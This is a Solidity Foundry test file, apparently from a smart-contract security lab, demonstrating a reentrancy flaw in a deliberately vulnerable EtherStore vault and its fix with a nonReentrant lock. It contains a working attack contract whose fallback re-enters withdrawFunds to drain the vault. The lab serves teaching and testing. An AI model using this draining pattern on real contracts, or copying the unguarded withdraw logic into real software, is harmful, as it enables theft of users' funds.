// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

// EtherStore is a simple vault, it can manage everyone's ethers.
// But it's vulnerable, can you steal all the ethers ?

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
        balances[msg.sender] -= _weiToWithdraw;
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public balances;
    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant{
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");
        balances[msg.sender] -= _weiToWithdraw;
    }
}

contract ContractTest is Test {
        EtherStore store;
        EtherStoreRemediated storeRemediated;
        EtherStoreAttack attack;
        EtherStoreAttack attackRemediated;
    
    function setUp() public { 
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        attack = new EtherStoreAttack(address(store));
        attackRemediated = new EtherStoreAttack(address(storeRemediated));
        vm.deal(address(store), 5 ether);  
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(attack), 2 ether); 
        vm.deal(address(attackRemediated), 2 ether);  
    }

function testReentrancy() public {
        attack.Attack();  // exploit here
 
    }

function testFailRemediated() public {
        attackRemediated.Attack();
     }
}



contract EtherStoreAttack is DSTest { 
    EtherStore store;
    constructor(address _store) public {
        store = EtherStore(_store);
    }

    function Attack() public {   
        emit log_named_decimal_uint("Start attack, EtherStore balance", address(store).balance, 18);
        store.deposit{value: 1 ether}();  
        emit log_named_decimal_uint("Deposited 1 Ether, EtherStore balance", address(store).balance, 18);
        emit log_string("==================== Start of attack ====================");
        store.withdrawFunds(1 ether);   // exploit here
        emit log_string("==================== End of attack ====================");
        emit log_named_decimal_uint("End of attack, EtherStore balance:", address(store).balance, 18);
        emit log_named_decimal_uint("End of attack, Attacker balance:", address(this).balance, 18);
    }

    fallback() external payable {
        emit log_named_decimal_uint("EtherStore balance", address(store).balance, 18);
        emit log_named_decimal_uint("Attacker balance", address(this).balance, 18);
        if (address(store).balance >= 1 ether) {
            emit log_string("Reenter");
            store.withdrawFunds(1 ether);   // exploit here
        }
    }
}

